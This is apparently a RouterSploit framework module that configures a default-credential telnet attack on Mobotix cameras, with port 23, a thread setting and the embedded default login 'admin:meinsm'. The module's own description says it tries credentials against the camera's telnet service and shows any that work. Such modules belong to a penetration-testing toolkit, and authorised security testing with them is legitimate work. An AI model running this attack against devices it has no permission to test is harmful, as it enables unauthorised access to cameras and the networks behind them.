from routersploit.core.exploit import *
from routersploit.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "Mobitix Camer Default Telnet Creds",
        "description": "Module performs dictionary attack against Mobitix Camera Telnet service. "
                       "If valid credentials are found, they are displayed tot he user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Mobotix Camera",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:meinsm", "User:Pass or file with default credentials (file://)")
